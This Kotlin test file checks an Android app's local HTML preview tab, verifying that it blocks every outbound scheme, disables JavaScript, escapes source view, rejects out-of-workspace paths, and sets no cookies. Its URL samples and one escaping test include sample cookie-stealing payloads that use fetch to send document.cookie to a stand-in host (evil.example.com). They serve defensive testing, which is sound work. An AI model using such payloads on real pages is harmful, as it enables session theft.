// 独立开发声明：本文件为本项目从零编写，未参考任何第三方同类应用的代码。
//
// 依据：派工单 2026-10-19 第五十九批 §5 验收（玄览本地预览页签：只显示、默认断网、默认禁 JS）
// 与 §7（W6：抱朴写页面 → 在玄览里看，App 不替它执行）。
//
// ## 为什么这里既有行为断言、又有源码门禁
// §5 的四条验收（外发 http(s) 计数 0、禁 JS 时脚本不跑、越界路径拒、非 HTML 按文本、
// 改过的内容不是缓存）里，**只有前两条能在 JVM 里真打**——因为判据被收在零 Android 的
// [LocalPreviewPolicy] 里（本文件判据 A–H 打的就是它）。WebView 本身在单测里是桩，
// 造不出真的 `shouldInterceptRequest` 回调，所以「假 WebViewClient 计数」这一条退化成
// 两半：**判据半边**（A/B：把 URL 逐条喂给真正被调用的那个函数）+ **接线半边**
// （H/I：源码门禁确认引擎确实在用这个函数、用的是 `main.post` 而不是 `webView.post`）。
// 两半合起来才等于"外发计数 0"，缺任何一半都不算验过——真机读数（页面里图片是否真的裂、
// 脚本是否真的不跑）归蓝总管采，报告里如实写着。
package com.example.zhengdao.ui.browser

import androidx.core.net.toUri
import com.example.zhengdao.CodeText
import com.example.zhengdao.browser.EngineSecurityConfig
import com.example.zhengdao.browser.LocalPreviewPolicy
import com.example.zhengdao.browser.PreviewMode
import com.example.zhengdao.baopu.agent.ToolGroup
import com.example.zhengdao.baopu.agent.ToolGroupTable
import com.example.zhengdao.baopu.agent.ToolOutcome
import com.example.zhengdao.baopu.agent.PreviewTool
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

/** 第五十九批 §5/§7：本地预览页签「只显示、不跑、不出网」。 */
class LocalPreviewTabTest {

    /**
     * 出站通道样本（判据 A/B 都吃这一张表）。
     *
     * 覆盖面刻意比 §5.2 那句「拦掉所有 http/https」宽：`ws://`/`wss://`/`ftp://` 也是出站，
     * `file://` 是本机读盘，`intent://`/`mailto:` 会跳出浏览器，`blob:` 指向内存对象但
     * 由页面自己造（预览档不该有），`data:`/`about:` 是"内容在自己肚子里"的合法内联。
     */
    private val urls = listOf(
        "https://cn.bing.com/search?q=x",
        "http://example.com/a/b?c=1",
        "HTTPS://UPPER.example.com/",
        "https://127.0.0.1:8080/local",
        "https://10.0.0.5/internal",
        "http://[::1]:9/x",
        "ws://echo.websocket.org",
        "wss://secure.example/socket",
        "ftp://files.example.com/pub/x.txt",
        "file:///sdcard/Download/x.html",
        "content://media/external/images/media/1",
        "intent://scan/#Intent;scheme=zxing;end",
        "mailto:someone@example.com",
        "javascript:fetch('https://evil.example.com?c='+document.cookie)",
        "blob:https://example.com/8f2b-uuid",
        "about:blank",
        "data:image/png;base64,iVBORw0KGgo=",
        "/relative/only.css",
        "noscheme.example.com/x",
    )

    // ── 判据 A：§5.2「默认断网」＝外发请求计数为 0 ────────────────────────

    @Test
    fun `A1_预览档出站计数为零`() {
        val allowed = urls.filter { !LocalPreviewPolicy.blocksResource(it, blockAllNetwork = true) }
        assertEquals("预览档放出去的请求必须只有内联两类：$allowed", listOf("about:blank", "data:image/png;base64,iVBORw0KGgo="), allowed)
        // §5.2 逐字：所有 http/https 一律换空响应（这条单独点名，别被上面的白名单句式盖过去）
        val leaked = urls.filter { LocalPreviewPolicy.isNetwork(it) }
            .filter { !LocalPreviewPolicy.blocksResource(it, blockAllNetwork = true) }
        assertEquals("有 http/https 漏网：$leaked", emptyList<String>(), leaked)
        assertTrue("样本里必须真有 http/https，否则这条判据是空转", urls.any { LocalPreviewPolicy.isNetwork(it) })
    }

    @Test
    fun `A2_预览档也拦得住非http的出站通道`() {
        // 比派工单那句更严的地方要**点名钉住**：ws/wss/ftp/file/content 也算出站。
        // 将来谁把 blocksResource 改回 `blockAllNetwork && isNetwork(url)`，这条会红。
        listOf("ws://echo.websocket.org", "wss://secure.example/socket", "ftp://files.example.com/x",
            "file:///sdcard/Download/x.html", "content://media/external/images/media/1",
            "intent://scan/#Intent;scheme=zxing;end", "mailto:someone@example.com",
            "blob:https://example.com/8f2b-uuid", "/relative/only.css", "noscheme.example.com/x",
        ).forEach {
            assertTrue("预览档该拦的没拦：$it", LocalPreviewPolicy.blocksResource(it, blockAllNetwork = true))
        }
    }

    // ── 判据 B：§5.1「正常页签一个字节都不改」 ────────────────────────────

    @Test
    fun `B1_上网档的资源判据与改前的scheme白名单逐字等价`() {
        // 改前写的是 `private val allowedSchemes = setOf("http","https")` +
        // `isAllowedUrl = url.toUri().scheme?.lowercase() in allowedSchemes`。
        // 这里用**独立的**老写法（正则取 scheme，与 §5.1 那句"一个字节都不改"对照）逐条比。
        val oldWhitelist = setOf("http", "https")
        fun oldScheme(u: String): String? = Regex("^([A-Za-z][A-Za-z0-9+.-]*):").find(u)?.groupValues?.get(1)?.lowercase()
        urls.forEach {
            val oldBlocked = oldScheme(it) !in oldWhitelist
            val nowBlocked = LocalPreviewPolicy.blocksResource(it, blockAllNetwork = false)
            assertEquals("上网档判据变了（§5.1 不许改正常页签）：$it", oldBlocked, nowBlocked)
        }
    }

    @Test
    fun `B2_预览档的导航一律拒_上网档仍只放http`() {
        urls.forEach {
            assertFalse("预览档不该能导航到任何 URL：$it", LocalPreviewPolicy.allowsNavigation(it, blockAllNetwork = true))
        }
        urls.forEach {
            assertEquals(
                "上网档的导航判据必须还是那条白名单：$it",
                LocalPreviewPolicy.isNetwork(it),
                LocalPreviewPolicy.allowsNavigation(it, blockAllNetwork = false),
            )
        }
    }

    @Test
    fun `B3_正常页签的引擎配置仍是零参构造`() {
        // §5.1 第一条验收：正常标签的 JS/网络配置零改动。新档只能由预览页签拿到。
        val normal = EngineSecurityConfig()
        assertTrue("正常页签仍必须开 JS（浏览器核心能力）", normal.javaScriptEnabled)
        assertFalse("正常页签不许带上断网档", normal.blockAllNetwork)
        val preview = LocalPreviewPolicy.configFor(jsSandbox = false)
        assertTrue("预览档必须断网", preview.blockAllNetwork)
        assertFalse("预览档默认禁 JS（§5.2）", preview.javaScriptEnabled)
        // 差集只有三项（databaseEnabled 默认档已是 false，预览档显式写出来但值不变）
        val diff = listOf(
            "safeBrowsing" to (normal.safeBrowsingEnabled != preview.safeBrowsingEnabled),
            "mixedContent" to (normal.mixedContentMode != preview.mixedContentMode),
            "fileAccess" to (normal.allowFileAccess != preview.allowFileAccess),
            "fileFromUrl" to (normal.allowFileAccessFromFileUrls != preview.allowFileAccessFromFileUrls),
            "universal" to (normal.allowUniversalAccessFromFileUrls != preview.allowUniversalAccessFromFileUrls),
            "database" to (normal.databaseEnabled != preview.databaseEnabled),
            "js" to (normal.javaScriptEnabled != preview.javaScriptEnabled),
            "jsOpenWindow" to (normal.javaScriptCanOpenWindowsAutomatically != preview.javaScriptCanOpenWindowsAutomatically),
            "domStorage" to (normal.domStorageEnabled != preview.domStorageEnabled),
            "thirdPartyCookie" to (normal.thirdPartyCookiesEnabled != preview.thirdPartyCookiesEnabled),
            "jsInterfaces" to (normal.allowedJsInterfaces != preview.allowedJsInterfaces),
            "dataDirSuffix" to (normal.dataDirectorySuffix != preview.dataDirectorySuffix),
            "blockAllNetwork" to (normal.blockAllNetwork != preview.blockAllNetwork),
        ).filter { it.second }.map { it.first }
        assertEquals("预览档与默认档的差集必须是这三项（放宽任何一项都是拆红线）：$diff", listOf("js", "domStorage", "blockAllNetwork"), diff)
        // 红线三连照默认档：预览不是放宽入口
        assertFalse(preview.allowFileAccess)
        assertFalse(preview.allowFileAccessFromFileUrls)
        assertFalse(preview.allowUniversalAccessFromFileUrls)
        assertTrue(preview.safeBrowsingEnabled)
        assertEquals(EngineSecurityConfig.MIXED_CONTENT_NEVER_ALLOW, preview.mixedContentMode)
        assertFalse("第三方 cookie 不许因预览而打开", preview.thirdPartyCookiesEnabled)
        assertTrue("JS 接口白名单仍必须空（红线④）", preview.allowedJsInterfaces.isEmpty())
    }

    @Test
    fun `B4_JS沙箱档开脚本但仍断网`() {
        val c = LocalPreviewPolicy.configFor(jsSandbox = true)
        assertTrue("开了沙箱才允许脚本", c.javaScriptEnabled)
        assertTrue("沙箱档照样出不了网（§5.3）", c.blockAllNetwork)
        assertFalse("沙箱档也不许留 localStorage 痕迹", c.domStorageEnabled)
    }

    // ── 判据 C/D：§5.3 源码／渲染 ─────────────────────────────────────────

    @Test
    fun `C1_源码档整段转义_渲染档逐字`() {
        val raw = "<script>fetch('https://x?c='+document.cookie)</script>&\"中文\""
        val src = LocalPreviewPolicy.document("a.html", raw, PreviewMode.SOURCE)
        assertFalse("源码档里不许有能执行的 script 标记", src.contains("<script>"))
        assertTrue("内容要转义后显示：$src", src.contains("&lt;script&gt;"))
        assertTrue("正文一个字符都不丢", src.contains("fetch(&#39;https://x?c=&#39;+document.cookie)"))
        assertTrue("壳必须有 pre 与复制所需原文（单容器）", src.contains("<pre>"))
        assertEquals("渲染档必须逐字返回文件内容", raw, LocalPreviewPolicy.document("a.html", raw, PreviewMode.RENDER))
    }

    @Test
    fun `C2_转义顺序_and必须第一个换`() {
        // 反例：先换 < 再换 & 会得到 "&amp;lt;"，页面上显示成 "&lt;"——看源码看出个假字符串。
        assertEquals("&amp;lt;b&amp;gt;", LocalPreviewPolicy.escapeHtml("<b>").let { LocalPreviewPolicy.escapeHtml(it) })
        assertEquals("&lt;b&gt;", LocalPreviewPolicy.escapeHtml("<b>"))
    }

    @Test
    fun `D1_非HTML按文本_HTML按排版`() {
        assertEquals(PreviewMode.SOURCE, LocalPreviewPolicy.defaultMode("笔记.md"))
        assertEquals(PreviewMode.SOURCE, LocalPreviewPolicy.defaultMode("run.kt"))
        assertEquals(PreviewMode.SOURCE, LocalPreviewPolicy.defaultMode("noext"))
        assertEquals(PreviewMode.RENDER, LocalPreviewPolicy.defaultMode("首页.html"))
        assertEquals(PreviewMode.RENDER, LocalPreviewPolicy.defaultMode("PAGE.HTM"))
        // Markdown 故意算"非 HTML"：渲染它要么引依赖要么引脚本，两个都与"默认不跑脚本"打架
        assertFalse(LocalPreviewPolicy.isHtmlLike("readme.md"))
    }

    // ── 判据 E/F：页签状态（不污染正常页签 + 不留旧缓存） ──────────────────

    @Test
    fun `E1_预览状态不污染普通页签`() {
        val s = BrowserTabState()
        assertFalse("新建页签默认不是预览页签", s.isPreview())
        assertNull(s.previewPath)
        s.onPageStarted("https://cn.bing.com")
        s.onReceivedTitle("必应")
        assertFalse("走过正常导航的页签仍然不是预览页签", s.isPreview())
        assertEquals("https://cn.bing.com", s.url)
    }

    @Test
    fun `E2_同文件再次预览用的是新内容_模式不被拨回去`() {
        val s = BrowserTabState()
        s.openPreview("产物/首页.html", "<h1>第一版</h1>")
        assertTrue(s.isPreview())
        assertEquals("产物/首页.html", s.previewPath)
        assertEquals("模式按扩展名给默认（HTML 先排版）", PreviewMode.RENDER, s.previewMode)
        assertEquals("假地址只给人看", "local-preview://产物/首页.html", s.url)
        assertEquals("标签条与标题栏用文件名", "首页.html", s.previewFileName())
        assertTrue("预览天生有内容，不该闪起始页", s.everLoaded)
        assertTrue(s.previewDocument().contains("<h1>第一版</h1>"))

        // 抱朴改完再预览一次：**内容必须换**，模式不许把用户拨回去
        s.openPreview("产物/首页.html", "<h1>第二版</h1>")
        assertFalse("旧内容必须被顶掉（不留缓存假象）", s.previewDocument().contains("第一版"))
        assertTrue(s.previewDocument().contains("第二版"))
        assertEquals("同一文件再次预览不重置模式", PreviewMode.RENDER, s.previewMode)
        s.previewMode = PreviewMode.SOURCE
        s.openPreview("产物/首页.html", "<h1>第三版</h1>")
        assertEquals("用户停在源码档 ⇒ 再预览仍是源码档", PreviewMode.SOURCE, s.previewMode)

        // 换一个文件：模式重新按扩展名给
        s.openPreview("产物/说明.md", "hello")
        assertEquals("新文件按扩展名给默认", PreviewMode.SOURCE, s.previewMode)
        assertTrue(s.previewDocument().contains("hello"))
    }

    @Test
    fun `F1_预览请求是一次性事件_同内容重发也算新事件`() {
        val holder = LocalPreviewHolder
        assertNull(holder.pending)
        holder.request("a.html", "x")
        val first = holder.pending
        assertNotNull(first)
        assertEquals("a.html", first!!.relPath)
        holder.request("a.html", "x") // 路径与内容都一样
        assertTrue("同内容重发必须给新 seq（否则 LaunchedEffect 看不见、界面不动）", holder.pending!!.seq > first.seq)
        holder.pending = null
        assertNull(holder.pending)
    }

    @Test
    fun `E3_预览页签显示假地址_引擎报的about_blank擦不掉它`() {
        // §5.4「标明这是哪个文件」：注入通道的 base 是 about:blank，WebView 报上来的就是它。
        // 若照原样记进 state，地址栏/标签条会显示 about:blank ⇒ 用户认不出这是哪个文件。
        // 判据在 BrowserTabState.displayableUrl（委托只逐字转发 —— 那条写法被
        // BrowserTabStateTest 的源码门禁钉着，本批合流时踩到过一次，别再改回委托里判）。
        val s = BrowserTabState()
        s.openPreview("产物/首页.html", "<h1>正文</h1>")
        s.onPageStarted("about:blank")
        s.onPageFinished("about:blank")
        assertEquals("local-preview://产物/首页.html", s.url)
        assertFalse(
            "假地址不可导航（喂给导航判据也是拒）",
            LocalPreviewPolicy.allowsNavigation(s.url, blockAllNetwork = false),
        )
        // 对照：上网页签照旧记引擎报的地址（这一半是 §5.1「正常页签行为不改」）
        val n = BrowserTabState()
        n.onPageStarted("about:blank")
        assertEquals("about:blank", n.url)
        n.onPageFinished("https://cn.bing.com")
        assertEquals("https://cn.bing.com", n.url)
    }

    // ── 判据 G：§5.4「只显示工作区文件」——越界拒（走真守卫） ──────────────

    @Test
    fun `G1_越界路径直接拒_不存在的与目录分开说`() {
        val root = File(System.getProperty("java.io.tmpdir"), "zd-preview-root-${System.nanoTime()}").apply { mkdirs() }
        val outside = File(root.parentFile, "zd-preview-outside-${System.nanoTime()}.html").apply { writeText("<h1>外面</h1>") }
        try {
            val escaped = PreviewTool.preview(root, outside)
            assertTrue("越界必须 Rejected：$escaped", escaped is ToolOutcome.Rejected)
            assertTrue((escaped as ToolOutcome.Rejected).reason.contains("越界"))

            val missing = PreviewTool.preview(root, File(root, "没有这个.html"))
            assertTrue("不存在要单独说（合成一句模型会反复重试）：$missing", missing is ToolOutcome.Failed)
            assertTrue((missing as ToolOutcome.Failed).error.contains("不存在"))

            val dir = File(root, "某个目录").apply { mkdirs() }
            assertTrue((PreviewTool.preview(root, dir) as ToolOutcome.Failed).error.contains("不是一个文件"))
        } finally {
            outside.delete()
            root.deleteRecursively()
        }
    }

    @Test
    fun `G2_预览工具不写盘_且属于分组表里的组`() {
        assertEquals(ToolGroup.PREVIEW, ToolGroupTable.GROUP_OF[PreviewTool.NAME])
        // 它在 capabilities 的名册里（§5.2「工具要进那张分组表」）
        assertTrue(ToolGroupTable.namesOf(ToolGroup.PREVIEW).contains(PreviewTool.NAME))
        // 默认不可见（默认可见集合是 core/edit/compat）⇒ §7 那条"同轮两张卡"要一次解锁；
        // 这一条把取法钉在测试里，改它必须同时改判据（交付报告 §五 记了这个取舍）
        assertFalse(ToolGroup.PREVIEW in ToolGroup.DEFAULT_VISIBLE)
    }

    @Test
    fun `G3_显示成功与没接线是两档_sink回null算成功`() {
        // [PreviewSink.show] 回 null = "已交给页签"（成功）；sink 本身为 null 才是"没接线"。
        // 这一条钉的就是那个 elvis 坑：写成 `sink?.show(...) ?: "没接线"` 时，成功会被
        // 误报成"没接线"，抱朴于是以为预览没生效、来回重发同一份内容（2026-10-19 自查发现）。
        val root = File(System.getProperty("java.io.tmpdir"), "zd-preview-sink-${System.nanoTime()}").apply { mkdirs() }
        val html = File(root, "产物/首页.html").apply { parentFile.mkdirs(); writeText("<h1>你好</h1>") }
        val seen = mutableListOf<Pair<String, String>>()
        try {
            // 一、没接线：如实回 Failed，且不假装显示过
            PreviewTool.sink = null
            val unwired = PreviewTool.preview(root, html)
            assertTrue("没接线必须 Failed：$unwired", unwired is ToolOutcome.Failed)
            assertTrue((unwired as ToolOutcome.Failed).error.contains("没接线"))

            // 二、接了线且收下：Ok，且回灌里带"只显示/断网"那句口径（§5 的用户口径不能靠注释传达）
            PreviewTool.sink = object : com.example.zhengdao.baopu.agent.PreviewSink {
                override fun show(relPath: String, text: String): String? {
                    seen += relPath to text
                    return null
                }
            }
            val ok = PreviewTool.preview(root, html)
            assertTrue("显示成功必须 Ok：$ok", ok is ToolOutcome.Ok)
            assertTrue("成功回灌要说清只显示不执行：${(ok as ToolOutcome.Ok).text}", ok.text.contains("只显示"))
            assertEquals(1, seen.size)
            assertEquals("产物/首页.html", seen[0].first)
            assertEquals("<h1>你好</h1>", seen[0].second)

            // 三、页签侧拒绝（如玄览没起来）：回 Failed，并说明"文件没改"
            PreviewTool.sink = object : com.example.zhengdao.baopu.agent.PreviewSink {
                override fun show(relPath: String, text: String): String? = "玄览当前不可用"
            }
            val refused = PreviewTool.preview(root, html)
            assertTrue((refused as ToolOutcome.Failed).error.contains("玄览当前不可用"))
        } finally {
            PreviewTool.sink = null
            root.deleteRecursively()
        }
    }

    // ── 判据 H/I：接线侧源码门禁（判据选对了，还得真的在用） ──────────────

    /** 读主源码并去掉注释与字符串（判据钉代码，不钉散文；本体见 [CodeText]，与 ProgressiveToolsTest 同一把尺）。 */
    private fun code(rel: String): String =
        CodeText.codeOnly(
            File("src/main/java/com/example/zhengdao/$rel")
                .readText(Charsets.UTF_8)
                .replace("\r\n", "\n"),
        )

    @Test
    fun `H1_引擎的拦截与注入真的走那条判据`() {
        val engine = code("browser/WebViewEngine.kt")
        // 资源级：走 LocalPreviewPolicy.blocksResource，且吃的是本引擎记账的 config
        assertTrue("shouldInterceptRequest 必须走那条判据", engine.contains("LocalPreviewPolicy.blocksResource(url, config.blockAllNetwork)"))
        // 导航级：isAllowedUrl 必须委派同一条判据（不许再留第二份 scheme 白名单）
        assertTrue("导航判据必须委派", engine.contains("LocalPreviewPolicy.allowsNavigation(url, config.blockAllNetwork)"))
        assertFalse("白名单不许在引擎里再抄一份", engine.contains("allowedSchemes"))
        // 配置先记账：applySecurityConfig 第一行就 this.config = config（否则判据读的是旧档）
        assertTrue(
            "applySecurityConfig 必须先记账再 apply",
            Regex("fun applySecurityConfig\\(config: EngineSecurityConfig\\) \\{\\s*this\\.config = config")
                .containsMatchIn(engine),
        )
        // 注入通道：loadDataWithBaseURL（不是 file://、不是 loadUrl）
        val inject = engine.substringAfter("fun loadLocalDocument(").substringBefore("\n    }")
        assertTrue("注入必须走 loadDataWithBaseURL", inject.contains("loadDataWithBaseURL"))
        assertFalse("预览不许靠开 file:// 实现（红线）", inject.contains("loadUrl"))
        // 第㊳刀同规：主 Looper 的 main.post，不是 webView.post（未 attach 的 View 会压死首载）
        assertTrue("注入必须走 main.post", Regex("fun loadLocalDocument\\(html: String\\) \\{\\s*main\\.post").containsMatchIn(engine))
    }

    @Test
    fun `H2_预览页签先设档再注入`() {
        val mgr = code("ui/browser/BrowserTabManager.kt")
        val body = mgr.substringAfter("fun openPreviewTab(")
        // 「复用已有预览页签」那一段只注入、不建引擎（档早就装过了）；
        // 顺序判据只对**新建那一段**成立 ⇒ 从创建引擎那一行往后看（整段看会被复用支路
        // 里更早出现的那次注入误判成"先注入后设档"）。
        val fresh = body.substringAfter("val eng = WebViewEngine(wv)")
        val applyAt = fresh.indexOf("applySecurityConfig(LocalPreviewPolicy.configFor")
        val injectAt = fresh.indexOf("loadLocalDocument(")
        assertTrue("预览页签必须用预览档", applyAt >= 0)
        assertTrue("必须先设档再注入（反了则首屏按默认档跑脚本/出网）", injectAt > applyAt)
        // 复用支路确实重新注入了一次（§5 验收「改过的内容是新的，不是缓存」的界面那一半）
        assertTrue(
            "同文件再次预览必须重注入一次",
            body.substringBefore("canOpenMore").contains("loadLocalDocument("),
        )
        // §5.1：正常 newTab 仍是零参构造，一个字节不改
        val newTab = mgr.substringAfter("fun newTab(context: Context, url: String? = null): Int?").substringBefore("fun ")
        assertTrue("正常页签必须仍用默认档：$newTab", newTab.contains("EngineSecurityConfig()"))
        assertFalse("正常页签不许被换成预览档", newTab.contains("configFor"))
    }

    @Test
    fun `I1_预览不注入cookie_不共用登录态`() {
        // §5.2「不注入 cookie、不共享登录态」：预览档没有开任何 cookie 通道；
        // 且预览这一条路上不许出现 setCookie / flush()。
        val previewFiles = listOf(
            "browser/LocalPreviewPolicy.kt",
            "browser/WebViewEngine.kt",
            "ui/browser/BrowserTabManager.kt",
            "ui/browser/BrowserTabState.kt",
            "ui/browser/BrowserPreviewBar.kt",
            "ui/browser/LocalPreviewHolder.kt",
        ).map { it to code(it) }
        previewFiles.forEach { (name, src) ->
            assertFalse("$name 不许出现 setCookie（预览不该带登录态）", src.contains("setCookie"))
        }
        assertFalse("domStorage 关 ⇒ 预览页写不进 localStorage", LocalPreviewPolicy.configFor(true).domStorageEnabled)
        assertFalse("database 关 ⇒ 预览页写不进 WebSQL", LocalPreviewPolicy.configFor(true).databaseEnabled)
    }

    @Test
    fun `I2_预览页签的地址不是能导航的URL`() {
        assertTrue(LocalPreviewPolicy.isPreviewUrl("local-preview://产物/首页.html"))
        assertFalse(LocalPreviewPolicy.isPreviewUrl("https://x"))
        // 假地址进不了导航判据（scheme 不是 http/https）⇒ 就算有人把它喂 loadUrl 也出不去
        assertFalse(LocalPreviewPolicy.allowsNavigation("local-preview://a", blockAllNetwork = false))
        assertFalse(LocalPreviewPolicy.isNetwork("local-preview://a"))
    }
}
